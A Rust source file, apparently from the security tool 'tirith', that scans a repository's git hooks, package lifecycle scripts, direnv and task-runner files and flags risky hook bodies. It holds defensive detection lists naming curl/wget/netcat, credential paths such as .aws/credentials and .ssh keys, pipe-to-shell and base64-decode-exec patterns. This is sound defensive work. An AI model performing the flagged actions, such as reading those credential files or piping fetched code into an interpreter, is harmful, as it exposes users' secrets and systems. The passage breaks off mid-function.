//! Repo-hook + automation inventory and risk classification (M9 ch6).
//!
//! Inventories the executable surfaces a repo can run on your behalf — git hooks,
//! husky/lefthook/pre-commit, package-manager lifecycle scripts, direnv `.envrc`,
//! mise/asdf hooks — plus hand-run "automation" (`Makefile`, `justfile`, `Taskfile`).
//! Powers `tirith hooks scan|guard|explain`. Static read only — never executes a hook.
//!
//! Two entry points:
//! 1. **Full inventory** ([`scan_for_repo`] / [`scan_for_cwd`]) — every surface; what
//!    `tirith hooks scan` calls.
//! 2. **Hot-path leader-targeted** ([`scan_triggered_by_leader`]) — scans ONLY the hooks
//!    a leader triggers (`git commit` → pre-commit etc., NOT pre-push or the Makefile),
//!    keeping the hot path narrow. Gated behind `policy.hooks_guard_enabled`.
//!
//! The five rules (`RepoHookNetworkCall`, `RepoHookCredentialRead`, `RepoHookSudo`,
//! `RepoHookSuspiciousShellPattern`, `RepoHookExternalFetch`) carry NO PATTERN_TABLE
//! entry — the trigger is repo STATE plus a hot-path git/pkg command, not an input regex.
//! All five live in `EXTERNALLY_TRIGGERED_RULES`.
//!
//! Cache: [`scan_triggered_by_leader`] uses a process-global, repo-root-keyed cache (60s
//! TTL, also keyed on surface mtime so a hook edit busts it). `git pull`/`checkout`
//! explicitly busts via [`invalidate_cache_for`] (they can rewrite hooks).

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};
use std::sync::Mutex;
use std::time::{Duration, Instant, SystemTime};

use serde::{Deserialize, Serialize};

use crate::verdict::{RuleId, Severity};

/// TTL for the hot-path leader-targeted scan cache. The full `tirith hooks scan`
/// inventory bypasses the cache.
pub const HOOK_CACHE_TTL: Duration = Duration::from_secs(60);

/// Whether a surface is a *hook* (auto-run on a lifecycle event — the attack surface)
/// or *automation* (a task runner run by hand — inventoried for completeness only).
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum HookCategory {
    /// Auto-executed on a tool lifecycle event.
    Hook,
    /// A task runner the developer invokes explicitly; not auto-scanned per command.
    Automation,
}

impl HookCategory {
    pub fn as_str(self) -> &'static str {
        match self {
            HookCategory::Hook => "hook",
            HookCategory::Automation => "automation",
        }
    }
}

/// Which tool owns a surface. Drives `explain` output and per-leader targeting.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum HookProvider {
    /// `.git/hooks/<name>`.
    Git,
    /// `.husky/<name>`.
    Husky,
    /// `lefthook.yml` (a config that names commands per git event).
    Lefthook,
    /// `.pre-commit-config.yaml`.
    PreCommit,
    /// `package.json` lifecycle script (`preinstall`/`install`/`postinstall`/`prepare`).
    PackageJson,
    /// `.envrc` (direnv).
    Direnv,
    /// `mise.toml` / `.mise.toml` / `.tool-versions` (asdf/mise tool hooks).
    Mise,
    /// `Makefile`.
    Makefile,
    /// `justfile` / `Justfile`.
    Justfile,
    /// `Taskfile.yml` / `Taskfile.yaml`.
    Taskfile,
}

impl HookProvider {
    pub fn as_str(self) -> &'static str {
        match self {
            HookProvider::Git => "git",
            HookProvider::Husky => "husky",
            HookProvider::Lefthook => "lefthook",
            HookProvider::PreCommit => "pre-commit",
            HookProvider::PackageJson => "package.json",
            HookProvider::Direnv => "direnv",
            HookProvider::Mise => "mise/asdf",
            HookProvider::Makefile => "makefile",
            HookProvider::Justfile => "justfile",
            HookProvider::Taskfile => "taskfile",
        }
    }

    fn category(self) -> HookCategory {
        match self {
            // Task runners + mise/asdf are "automation" — inventory-only, not auto-scanned.
            HookProvider::Makefile
            | HookProvider::Justfile
            | HookProvider::Taskfile
            | HookProvider::Mise => HookCategory::Automation,
            _ => HookCategory::Hook,
        }
    }
}

/// One enumerated hook / automation surface, with its body and any findings.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RepoHookEntry {
    /// Display name (`pre-commit`, `postinstall`, `Makefile`, `.envrc`, …).
    pub name: String,
    /// hook vs automation.
    pub category: HookCategory,
    /// Owning tool.
    pub provider: HookProvider,
    /// The file the body was read from.
    pub source_path: PathBuf,
    /// Classified body text (empty on non-UTF-8). NEVER printed verbatim — the CLI
    /// credential-redacts it at the presentation layer.
    pub body: String,
    /// Git lifecycle event(s) this surface triggers (for per-leader targeting); empty
    /// for automation and package lifecycle scripts.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub git_events: Vec<String>,
    /// Findings against this entry's body.
    pub findings: Vec<RepoHookFinding>,
}

impl RepoHookEntry {
    /// `true` when any finding against this entry is High or Critical.
    pub fn has_high(&self) -> bool {
        self.findings.iter().any(RepoHookFinding::is_high)
    }

    /// Highest severity across this entry's findings, if any.
    pub fn max_severity(&self) -> Option<Severity> {
        self.findings.iter().map(|f| f.severity).max()
    }
}

/// A single risk finding emitted for a [`RepoHookEntry`].
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RepoHookFinding {
    /// The rule that fired.
    pub rule_id: RuleId,
    /// Severity.
    pub severity: Severity,
    /// Hook / surface name the finding is about.
    pub name: String,
    /// Owning tool.
    pub provider: HookProvider,
    /// Human-readable location (full file path).
    pub location: String,
    /// Why the rule fired. Echoes the matched token only, never the body (may hold a secret).
    pub detail: String,
}

impl RepoHookFinding {
    pub fn is_high(&self) -> bool {
        matches!(self.severity, Severity::High | Severity::Critical)
    }
}

/// Full result of a hook inventory scan.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct RepoHookScan {
    /// The repo root that was scanned (display form). `None` when no `.git`
    /// boundary / scan root was resolvable.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub repo_root: Option<String>,
    /// Every surface discovered (hooks first, then automation).
    pub entries: Vec<RepoHookEntry>,
}

impl RepoHookScan {
    /// All findings flattened across every entry.
    pub fn all_findings(&self) -> Vec<&RepoHookFinding> {
        self.entries
            .iter()
            .flat_map(|e| e.findings.iter())
            .collect()
    }

    /// `true` when any entry carries a High/Critical finding (drives exit 1).
    pub fn has_high(&self) -> bool {
        self.entries.iter().any(RepoHookEntry::has_high)
    }

    /// Count of entries in each category.
    pub fn category_counts(&self) -> (usize, usize) {
        let hooks = self
            .entries
            .iter()
            .filter(|e| e.category == HookCategory::Hook)
            .count();
        let automation = self.entries.len() - hooks;
        (hooks, automation)
    }
}

/// Full inventory scan of the repo containing the cwd. Resolves the repo root via
/// [`crate::policy::find_repo_root`], falling back to the cwd when there's no `.git`
/// boundary so a non-git project still gets coverage. Empty scan when no root resolves.
pub fn scan_for_cwd() -> RepoHookScan {
    let root = crate::policy::find_repo_root(None).or_else(|| std::env::current_dir().ok());
    match root {
        Some(r) => scan_for_repo(&r),
        None => RepoHookScan::default(),
    }
}

/// Testable full-inventory entry point: enumerate + classify every surface under
/// `repo_root`. Static read only.
pub fn scan_for_repo(repo_root: &Path) -> RepoHookScan {
    let entries = collect_all(repo_root);
    RepoHookScan {
        repo_root: Some(repo_root.display().to_string()),
        entries,
    }
}

/// Look up a surface by name for `tirith hooks explain`. Returns every matching entry
/// (a name like `pre-commit` can exist under `.git/hooks`, `.husky`, AND `lefthook.yml`).
pub fn explain_for_cwd(name: &str) -> Vec<RepoHookEntry> {
    let scan = scan_for_cwd();
    scan.entries
        .into_iter()
        .filter(|e| e.name == name)
        .collect()
}

/// Testable `explain` entry point.
pub fn explain_for_repo(repo_root: &Path, name: &str) -> Vec<RepoHookEntry> {
    scan_for_repo(repo_root)
        .entries
        .into_iter()
        .filter(|e| e.name == name)
        .collect()
}

/// Hot-path leader-targeted scan: findings ONLY for the hooks `leader` + `subcommand`
/// actually triggers. `None` when not a hook-triggering command (engine skips cheaply);
/// `Some(vec![])` when triggering but clean.
///
/// Per-leader targeting (load-bearing scope):
/// - `git commit` → pre-commit, prepare-commit-msg, commit-msg, post-commit.
/// - `git push` → pre-push.
/// - `git pull`/`merge`/`rebase`/`checkout` → post-merge/checkout/rewrite; cache busted
///   first (these can rewrite hooks).
/// - `npm/yarn/pnpm install|ci` → `package.json` lifecycle scripts only.
/// - `direnv allow|reload` → `.envrc` only.
///
/// `Makefile`/`justfile`/`Taskfile` are NEVER returned (inventory-only).
pub fn scan_triggered_by_leader(
    repo_root: &Path,
    leader: &str,
    subcommand: Option<&str>,
) -> Option<Vec<RepoHookFinding>> {
    let target = LeaderTarget::resolve(leader, subcommand)?;

    // `git pull`/`checkout`/`merge`/`rebase` can rewrite hooks — bust the cache.
    if target.invalidate_cache {
        invalidate_cache_for(repo_root);
    }

    let scan = cached_scan(repo_root);

    let findings = scan
        .entries
        .iter()
        .filter(|e| target.matches(e))
        .flat_map(|e| e.findings.iter().cloned())
        .collect();
    Some(findings)
}

/// `true` when `leader` + `subcommand` form a hook-triggering command. Cheap predicate
/// the engine uses to force past the tier-1 fast-exit under `hooks_guard_enabled` —
/// without it a clean-looking `git commit` would never reach the hook scan.
pub fn is_hook_triggering_leader(leader: &str, subcommand: Option<&str>) -> bool {
    LeaderTarget::resolve(leader, subcommand).is_some()
}

/// What a hot-path leader triggers. Built by [`LeaderTarget::resolve`].
struct LeaderTarget {
    /// Git lifecycle events fired (empty for non-git leaders).
    git_events: &'static [&'static str],
    /// Whether `package.json` lifecycle scripts are triggered.
    package_lifecycle: bool,
    /// Whether `.envrc` (direnv) is triggered.
    direnv: bool,
    /// Whether to bust the cache first (git pull/checkout/merge/rebase).
    invalidate_cache: bool,
}

impl LeaderTarget {
    fn resolve(leader: &str, subcommand: Option<&str>) -> Option<Self> {
        // Basename + lowercase so `/usr/bin/git` and `GIT` both match.
        let leader = leader_basename(leader).to_ascii_lowercase();
        let sub = subcommand.map(|s| s.to_ascii_lowercase());
        let sub = sub.as_deref();

        match leader.as_str() {
            "git" => {
                let events: &'static [&'static str] = match sub {
                    Some("commit") => &[
                        "pre-commit",
                        "prepare-commit-msg",
                        "commit-msg",
                        "post-commit",
                    ],
                    Some("push") => &["pre-push"],
                    Some("pull") | Some("merge") => &["post-merge"],
                    Some("rebase") => &["post-rewrite"],
                    Some("checkout") => &["post-checkout"],
                    _ => return None,
                };
                let invalidate = matches!(
                    sub,
                    Some("pull") | Some("merge") | Some("rebase") | Some("checkout")
                );
                Some(LeaderTarget {
                    git_events: events,
                    package_lifecycle: false,
                    direnv: false,
                    invalidate_cache: invalidate,
                })
            }
            "npm" => match sub {
                // Only install/i/ci run the lifecycle scripts; `npm run <script>` runs one
                // named script and must NOT surface preinstall/postinstall findings.
                Some("install") | Some("i") | Some("ci") => Some(LeaderTarget {
                    git_events: &[],
                    package_lifecycle: true,
                    direnv: false,
                    invalidate_cache: false,
                }),
                _ => None,
            },
            "yarn" | "pnpm" => match sub {
                // No subcommand also installs.
                None | Some("install") | Some("ci") => Some(LeaderTarget {
                    git_events: &[],
                    package_lifecycle: true,
                    direnv: false,
                    invalidate_cache: false,
                }),
                _ => None,
            },
            "direnv" => match sub {
                Some("allow") | Some("reload") => Some(LeaderTarget {
                    git_events: &[],
                    package_lifecycle: false,
                    direnv: true,
                    invalidate_cache: false,
                }),
                _ => None,
            },
            _ => None,
        }
    }

    /// `true` when `entry` is one of the surfaces this leader triggers.
    fn matches(&self, entry: &RepoHookEntry) -> bool {
        match entry.provider {
            HookProvider::PackageJson => self.package_lifecycle,
            HookProvider::Direnv => self.direnv,
            HookProvider::Git
            | HookProvider::Husky
            | HookProvider::Lefthook
            | HookProvider::PreCommit => {
                // Match by git event; fall back to matching the hook NAME when we
                // couldn't tag it with a git_event.
                !self.git_events.is_empty()
                    && (entry
                        .git_events
                        .iter()
                        .any(|e| self.git_events.contains(&e.as_str()))
                        || self.git_events.contains(&entry.name.as_str()))
            }
            // Automation + mise/asdf are never triggered by a pkg/git/direnv command.
            HookProvider::Makefile
            | HookProvider::Justfile
            | HookProvider::Taskfile
            | HookProvider::Mise => false,
        }
    }
}

/// The basename of a leader token (`/usr/bin/git` → `git`, `git` → `git`).
fn leader_basename(leader: &str) -> &str {
    let leader = leader.trim_matches(|c: char| c == '"' || c == '\'');
    leader
        .rsplit(['/', '\\'])
        .next()
        .filter(|s| !s.is_empty())
        .unwrap_or(leader)
}

/// One cached full-inventory scan, keyed by repo root + surface mtime fingerprint
/// (busts on any hook-file change; TTL bounds staleness for untouched repos).
struct HookCacheEntry {
    root: PathBuf,
    fingerprint: u64,
    at: Instant,
    scan: RepoHookScan,
}

static HOOK_CACHE: Mutex<Option<HookCacheEntry>> = Mutex::new(None);

/// Return a fresh cached inventory for `repo_root` (same root + fingerprint, within
/// [`HOOK_CACHE_TTL`]); otherwise scan and cache.
fn cached_scan(repo_root: &Path) -> RepoHookScan {
    let fingerprint = surface_fingerprint(repo_root);

    // Recover from a poisoned lock — the guarded value is a plain data cache, safe to reuse.
    {
        let guard = HOOK_CACHE.lock().unwrap_or_else(|e| e.into_inner());
        if let Some(entry) = guard.as_ref() {
            if entry.root == repo_root
                && entry.fingerprint == fingerprint
                && entry.at.elapsed() < HOOK_CACHE_TTL
            {
                return entry.scan.clone();
            }
        }
    }

    let scan = scan_for_repo(repo_root);

    {
        let mut guard = HOOK_CACHE.lock().unwrap_or_else(|e| e.into_inner());
        *guard = Some(HookCacheEntry {
            root: repo_root.to_path_buf(),
            fingerprint,
            at: Instant::now(),
            scan: scan.clone(),
        });
    }

    scan
}

/// Drop any cached scan for `repo_root` (before a git pull/checkout/merge/rebase scan,
/// which can rewrite hooks).
pub fn invalidate_cache_for(repo_root: &Path) {
    let mut guard = HOOK_CACHE.lock().unwrap_or_else(|e| e.into_inner());
    if guard.as_ref().map(|e| e.root == repo_root).unwrap_or(false) {
        *guard = None;
    }
}

/// Combine the hook-bearing surfaces' mtimes into one fingerprint; any add/remove/edit
/// changes it, busting the cache. Cheap (a handful of `stat`s).
fn surface_fingerprint(repo_root: &Path) -> u64 {
    use std::hash::Hasher;
    let mut hasher = std::collections::hash_map::DefaultHasher::new();

    // Directories are walked one level (their entries' mtimes matter).
    let git_hooks = repo_root.join(".git/hooks");
    if let Ok(rd) = std::fs::read_dir(&git_hooks) {
        for entry in rd.flatten() {
            fingerprint_path(&entry.path(), &mut hasher);
        }
    }
    let husky = repo_root.join(".husky");
    if let Ok(rd) = std::fs::read_dir(&husky) {
        for entry in rd.flatten() {
            fingerprint_path(&entry.path(), &mut hasher);
        }
    }
    for rel in SINGLE_FILE_SURFACES {
        fingerprint_path(&repo_root.join(rel), &mut hasher);
    }
    hasher.finish()
}

fn fingerprint_path(path: &Path, hasher: &mut impl std::hash::Hasher) {
    use std::hash::Hash;
    if let Ok(md) = std::fs::metadata(path) {
        if let Ok(mtime) = md.modified() {
            if let Ok(dur) = mtime.duration_since(SystemTime::UNIX_EPOCH) {
                path.to_string_lossy().hash(hasher);
                dur.as_nanos().hash(hasher);
                md.len().hash(hasher);
            }
        }
    }
}

/// Single-file surfaces whose mtime feeds the fingerprint (and that `collect_all` reads).
const SINGLE_FILE_SURFACES: &[&str] = &[
    "lefthook.yml",
    "lefthook.yaml",
    ".pre-commit-config.yaml",
    ".pre-commit-config.yml",
    "package.json",
    ".envrc",
    "mise.toml",
    ".mise.toml",
    ".tool-versions",
    "Makefile",
    "makefile",
    "justfile",
    "Justfile",
    "Taskfile.yml",
    "Taskfile.yaml",
];

/// Enumerate every hook / automation surface under `repo_root`.
fn collect_all(repo_root: &Path) -> Vec<RepoHookEntry> {
    let mut entries = Vec::new();

    collect_git_hooks(repo_root, &mut entries);
    collect_husky(repo_root, &mut entries);
    collect_lefthook(repo_root, &mut entries);
    collect_pre_commit(repo_root, &mut entries);
    collect_package_json(repo_root, &mut entries);
    collect_direnv(repo_root, &mut entries);
    collect_mise(repo_root, &mut entries);
    collect_automation(repo_root, &mut entries);

    entries
}

/// Read any non-`.sample` file in `.git/hooks` (git's shipped samples are inert).
fn collect_git_hooks(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
    let dir = repo_root.join(".git/hooks");
    let Ok(rd) = std::fs::read_dir(&dir) else {
        return;
    };
    for entry in rd.flatten() {
        let path = entry.path();
        let Some(name) = path.file_name().and_then(|n| n.to_str()) else {
            continue;
        };
        // Skip git's shipped samples — they are inert until renamed.
        if name.ends_with(".sample") {
            continue;
        }
        if !path.is_file() {
            continue;
        }
        push_hook_file(
            out,
            name.to_string(),
            HookProvider::Git,
            path.clone(),
            vec![name.to_string()],
        );
    }
}

/// husky v5+ stores one script per git-event under `.husky/`. `.husky/_/` is its
/// bootstrap dir — skip it.
fn collect_husky(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
    let dir = repo_root.join(".husky");
    let Ok(rd) = std::fs::read_dir(&dir) else {
        return;
    };
    for entry in rd.flatten() {
        let path = entry.path();
        let Some(name) = path.file_name().and_then(|n| n.to_str()) else {
            continue;
        };
        if name.starts_with('_') || name.starts_with('.') {
            continue; // .husky/_/, .gitignore, etc.
        }
        if !path.is_file() {
            continue;
        }
        push_hook_file(
            out,
            name.to_string(),
            HookProvider::Husky,
            path.clone(),
            vec![name.to_string()],
        );
    }
}

/// Read a git/husky hook FILE and push its entry. An unreadable file (perms / non-UTF-8)
/// is NOT silently dropped — a deliberately-unreadable hook is the one a scan must not
/// miss — it surfaces as an Info "present but unreadable" finding.
fn push_hook_file(
    out: &mut Vec<RepoHookEntry>,
    name: String,
    provider: HookProvider,
    path: PathBuf,
    git_events: Vec<String>,
) {
    match read_text(&path) {
        Some(body) => push_entry(out, name, provider, path, body, git_events),
        None => {
            let location = path.display().to_string();
            let finding = RepoHookFinding {
                rule_id: RuleId::RepoHookSuspiciousShellPattern,
                severity: Severity::Info,
                name: name.clone(),
                provider,
                location: location.clone(),
                detail: "hook present but unreadable (permission denied or non-UTF-8) — \
                         review manually"
                    .to_string(),
            };
            out.push(RepoHookEntry {
                name,
                category: provider.category(),
                provider,
                source_path: path,
                body: String::new(),
                git_events,
                findings: vec![finding],
            });
        }
    }
}

/// Parse `lefthook.yml` into one classifiable body per top-level git event (so a `run:`
/// `curl` fires). Best-effort YAML-ish: scan top-level event keys, attribute lines under each.
fn collect_lefthook(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
    for rel in ["lefthook.yml", "lefthook.yaml"] {
        let path = repo_root.join(rel);
        let Some(contents) = read_text(&path) else {
            continue;
        };
        for (event, body) in lefthook_events(&contents) {
            push_entry(
                out,
                event.clone(),
                HookProvider::Lefthook,
                path.clone(),
                body,
                vec![event],
            );
        }
        return; // only one lefthook config
    }
}

/// Extract `(git_event, body)` blocks: a top-level key naming a known git event starts a
/// block; every more-indented line until the next top-level key is its body.
fn lefthook_events(contents: &str) -> Vec<(String, String)> {
    let mut out: Vec<(String, String)> = Vec::new();
    let mut current: Option<(String, String)> = None;
    for line in contents.lines() {
        let trimmed = line.trim_start();
        let indent = line.len() - trimmed.len();
        // A top-level key (no indent) ending in `:` may start an event block.
        if indent == 0 {
            if let Some(key) = trimmed.strip_suffix(':').map(str::trim) {
                if GIT_EVENTS.contains(&key) {
                    if let Some(c) = current.take() {
                        out.push(c);
                    }
                    current = Some((key.to_string(), String::new()));
                    continue;
                }
            }
            // A different top-level key ends the current block.
            if let Some(c) = current.take() {
                out.push(c);
            }
            continue;
        }
        if let Some((_, body)) = current.as_mut() {
            body.push_str(line);
            body.push('\n');
        }
    }
    if let Some(c) = current.take() {
        out.push(c);
    }
    out
}

/// Classify `.pre-commit-config.yaml` (whole file body) under the `pre-commit` event, so
/// a local `entry: curl …` fires.
fn collect_pre_commit(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
    for rel in [".pre-commit-config.yaml", ".pre-commit-config.yml"] {
        let path = repo_root.join(rel);
        let Some(contents) = read_text(&path) else {
            continue;
        };
        push_entry(
            out,
            "pre-commit".to_string(),
            HookProvider::PreCommit,
            path.clone(),
            contents,
            vec!["pre-commit".to_string()],
        );
        return;
    }
}

/// `package.json` lifecycle scripts (preinstall/install/postinstall/prepare), each its own
/// entry (no git event). Parsed with `serde_json`; a malformed manifest is skipped.
fn collect_package_json(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
    let path = repo_root.join("package.json");
    let Some(contents) = read_text(&path) else {
        return;
    };
    let Ok(value) = serde_json::from_str::<serde_json::Value>(&contents) else {
        return;
    };
    let Some(scripts) = value.get("scripts").and_then(|s| s.as_object()) else {
        return;
    };
    const LIFECYCLE: &[&str] = &["preinstall", "install", "postinstall", "prepare"];
    for key in LIFECYCLE {
        if let Some(cmd) = scripts.get(*key).and_then(|v| v.as_str()) {
            push_entry(
                out,
                (*key).to_string(),
                HookProvider::PackageJson,
                path.clone(),
                cmd.to_string(),
                Vec::new(),
            );
        }
    }
}

/// `.envrc` (direnv) — auto-sourced on `cd` after `direnv allow`. Whole file is the body.
fn collect_direnv(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
    let path = repo_root.join(".envrc");
    let Some(contents) = read_text(&path) else {
        return;
    };
    push_entry(
        out,
        ".envrc".to_string(),
        HookProvider::Direnv,
        path,
        contents,
        Vec::new(),
    );
}

/// mise/asdf tool hooks (`mise.toml`, `.mise.toml`, `.tool-versions`). Reported under
/// "automation" per the spec (not auto-scanned per package command).
fn collect_mise(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
    let surfaces: &[(&str, HookProvider)] = &[
        ("mise.toml", HookProvider::Mise),
        (".mise.toml", HookProvider::Mise),
        (".tool-versions", HookProvider::Mise),
    ];
    collect_named_surfaces(repo_root, surfaces, out);
}

/// Automation task runners (`Makefile`, `justfile`, `Taskfile.yml`) — inventory only.
fn collect_automation(repo_root: &Path, out: &mut Vec<RepoHookEntry>) {
    let surfaces: &[(&str, HookProvider)] = &[
        ("Makefile", HookProvider::Makefile),
        ("makefile", HookProvider::Makefile),
        ("justfile", HookProvider::Justfile),
        ("Justfile", HookProvider::Justfile),
        ("Taskfile.yml", HookProvider::Taskfile),
        ("Taskfile.yaml", HookProvider::Taskfile),
    ];
    collect_named_surfaces(repo_root, surfaces, out);
}

/// Read each `(relative_name, provider)` surface under `repo_root`, deduplicated by
/// canonical path — matters on case-insensitive filesystems where `Makefile`/`makefile`
/// resolve to the same file and would otherwise be inventoried twice.
fn collect_named_surfaces(
    repo_root: &Path,
    surfaces: &[(&str, HookProvider)],
    out: &mut Vec<RepoHookEntry>,
) {
    let mut seen: Vec<PathBuf> = Vec::new();
    for (rel, provider) in surfaces {
        let path = repo_root.join(rel);
        let Some(contents) = read_text(&path) else {
            continue;
        };
        // Canonicalize for the dedup key; fall back to the literal path.
        let canon = path.canonicalize().unwrap_or_else(|_| path.clone());
        if seen.contains(&canon) {
            continue;
        }
        seen.push(canon);
        let name = path
            .file_name()
            .and_then(|n| n.to_str())
            .unwrap_or(rel)
            .to_string();
        push_entry(out, name, *provider, path, contents, Vec::new());
    }
}

/// Build + classify an entry (the five rules over its body) and append it to `out`.
fn push_entry(
    out: &mut Vec<RepoHookEntry>,
    name: String,
    provider: HookProvider,
    source_path: PathBuf,
    body: String,
    git_events: Vec<String>,
) {
    let category = provider.category();
    let location = source_path.display().to_string();
    let findings = classify_body(&name, provider, &location, &body);
    out.push(RepoHookEntry {
        name,
        category,
        provider,
        source_path,
        body,
        git_events,
        findings,
    });
}

/// Run the five repo-hook rules over a hook body, High rules first so the most severe
/// finding is listed first.
fn classify_body(
    name: &str,
    provider: HookProvider,
    location: &str,
    body: &str,
) -> Vec<RepoHookFinding> {
    let mut out = Vec::new();
    if body.trim().is_empty() {
        return out;
    }

    let mk = |rule_id: RuleId, severity: Severity, detail: String| RepoHookFinding {
        rule_id,
        severity,
        name: name.to_string(),
        provider,
        location: location.to_string(),
        detail,
    };

    // Rule 1 — network call (High): curl/wget/nc/ncat/netcat as a command word.
    if let Some(tool) = body_network_tool(body) {
        out.push(mk(
            RuleId::RepoHookNetworkCall,
            Severity::High,
            format!("hook body invokes `{tool}` (network call)"),
        ));
    }

    // Rule 2 — credential read (High): references a well-known credential path.
    if let Some(target) = body_reads_credential(body) {
        out.push(mk(
            RuleId::RepoHookCredentialRead,
            Severity::High,
            format!("hook body references credential path `{target}`"),
        ));
    }

    // Rule 3 — sudo (High): a `sudo` command word.
    if contains_command_word(body, "sudo") {
        out.push(mk(
            RuleId::RepoHookSudo,
            Severity::High,
            "hook body uses `sudo` (privilege escalation)".to_string(),
        ));
    }

    // Rule 4 — suspicious shell pattern (Medium): pipe-to-interpreter / base64-decode-exec.
    if let Some(detail) = body_suspicious_shell_pattern(body) {
        out.push(mk(
            RuleId::RepoHookSuspiciousShellPattern,
            Severity::Medium,
            detail,
        ));
    }

    // Rule 5 — external fetch (Medium): npx / pnpm dlx / a bare URL handed to a fetcher.
    // Mutually exclusive with Rule 1 — skip when the curl/wget High path already fired.
    let network_call_fired = out.iter().any(|f| f.rule_id == RuleId::RepoHookNetworkCall);
    if !network_call_fired {
        if let Some(detail) = body_external_fetch(body) {
            out.push(mk(RuleId::RepoHookExternalFetch, Severity::Medium, detail));
        }
    }

    out
}

/// Network tools a hook body must not silently invoke. Returns the first match.
fn body_network_tool(body: &str) -> Option<&'static str> {
    const TOOLS: &[&str] = &["curl", "wget", "nc", "ncat", "netcat"];
    TOOLS
        .iter()
        .find(|&&tool| contains_command_word(body, tool))
        .copied()
}

/// Credential-path fragments a hook body must not read. Returns the first match.
fn body_reads_credential(body: &str) -> Option<String> {
    // Specific sub-paths/filenames: a plain substring match is safe (distinctive enough).
    const SPECIFIC: &[&str] = &[
        ".aws/credentials",
        ".aws/config",
        ".ssh/id_",
        ".netrc",
        ".npmrc",
        ".pypirc",
        ".docker/config.json",
        ".kube/config",
        ".git-credentials",
        ".config/gh/hosts.yml",
    ];
    for frag in SPECIFIC {
        if body.contains(frag) {
            return Some((*frag).to_string());
        }
    }
    // Bare roots: match only at a path boundary so `.env` doesn't fire on `.environment`
    // and `.ssh`/`.aws` don't fire on `mydir.sshconfig` (see `references_bare_root`).
    const BARE_ROOTS: &[&str] = &[".aws", ".ssh", ".env"];
    for frag in BARE_ROOTS {
        if references_bare_root(body, frag) {
            return Some((*frag).to_string());
        }
    }
    None
}

/// `true` when `frag` (a bare credential root like `.env`/`.ssh`) appears in `body` as a
/// path component (boundary before; `/`, whitespace, quote, EOS, or `.` after). Avoids the
/// `.environment` / `.sshconfig` false positive a plain `contains` would hit.
fn references_bare_root(body: &str, frag: &str) -> bool {
    let bytes = body.as_bytes();
    let flen = frag.len();
    let mut idx = 0;
    while let Some(rel) = body[idx..].find(frag) {
        let pos = idx + rel;
        let before_ok = pos == 0
            || matches!(
                bytes[pos - 1],
                b' ' | b'\t'
                    | b'|'
                    | b';'
                    | b'&'
                    | b'('
                    | b'`'
                    | b'='
                    | b'\n'
                    | b'/'
                    | b'"'
                    | b'\''
                    | b'$'
                    | b'~'
            );
        let after = pos + flen;
        let after_ok = after >= bytes.len()
            || matches!(
                bytes[after],
                b'/' | b' '
                    | b'\t'
                    | b'|'
                    | b';'
                    | b'&'
                    | b')'
                    | b'`'
                    | b'\n'
                    | b'\r'
                    | b'"'
                    | b'\''
                    | b'.'
            );
        if before_ok && after_ok {
            return true;
        }
        idx = pos + 1;
        if idx >= body.len() {
            break;
        }
    }
    false
}

/// Detect a pipe-to-interpreter or base64-decode-then-exec pattern (first match).
fn body_suspicious_shell_pattern(body: &str) -> Option<String> {
    // Pipe to a shell interpreter: `… | sh|bash|zsh|python|…`.
    const INTERPRETERS: &[&str] = &[
        "sh", "bash", "zsh", "dash", "ksh", "python", "python3", "perl", "ruby", "node",
    ];
    for line in body.lines() {
        if let Some(pipe) = line.find('|') {
            let after = line[pipe + 1..].trim_start();
            // First word after the pipe.
            let word = after.split_whitespace().next().unwrap_or("");
            let word = leader_basename(word);
            if INTERPRETERS.contains(&word) {
                return Some(format!("hook body pipes into interpreter `{word}`"));
            }
        }
    }
    // base64 decode then execute: `base64 -d` / `--decode`.
    if (contains_command_word(body, "base64"))
        && (body.contains("-d") || body.contains("--decode") || body.contains("-D"))
    {
        return Some("hook body decodes base64 content (possible obfuscated payload)".to_string());
    }
    if contains_command_word(body, "eval") {
        return Some("hook body uses `eval` (dynamic code execution)".to_string());
    }
    None
}

/// Detect an external fetch via a non-curl/wget downloader: `npx`/`pnpm dlx` of a remote
/// package, or a bare URL handed to a fetch helper/config.
fn body_external_fetch(body: &str) -> Option<String> {
    // A bare http(s):// URL anywhere is an external resource (Medium; curl/wget is Rule 1).
    if let Some(url) = first_external_url(body) {
        return Some(format!("hook body references external URL `{url}`"));
    }
    // `npx <pkg>` / `pnpm dlx <pkg>` fetch + run a remote package.
    for tool in ["npx", "dlx"] {
        if contains_command_word(body, tool) {
            return Some(format!(
                "hook body fetches + runs a remote package via `{tool}`"
            ));
        }
    }
    None
}

/// First `http(s)://` URL in `body`, truncated for display. Used by the external-fetch rule.
fn first_external_url(body: &str) -> Option<String> {
    for scheme in ["https://", "http://"] {
        if let Some(pos) = body.find(scheme) {
            let rest = &body[pos..];
            let end = rest
                .find(|c: char| c.is_whitespace() || c == '"' || c == '\'' || c == '`' || c == ')')
                .unwrap_or(rest.len());
            let url = &rest[..end];
            if url.len() > scheme.len() {
                let truncated: String = url.chars().take(80).collect();
                return Some(truncated);
            }
        }
    }
    None
}

/// `true` when `body` contains `word` as a command word (shell boundary before,
/// whitespace/end after) so `curl` inside `securely` or `/usr/bin/curling` doesn't fire;
/// a `/`-prefixed absolute path to the tool DOES match.
fn contains_command_word(body: &str, word: &str) -> bool {
    let bytes = body.as_bytes();
    let wlen = word.len();
    let mut idx = 0;
    while let Some(rel) = body[idx..].find(word) {
        let pos = idx + rel;
        let before_ok = pos == 0
            || matches!(
                bytes[pos - 1],
                b' ' | b'\t' | b'|' | b';' | b'&' | b'(' | b'`' | b'=' | b'\n' | b'/' | b'$'
            );
        let after = pos + wlen;
        let after_ok = after >= bytes.len()
            || matches!(
                bytes[after],
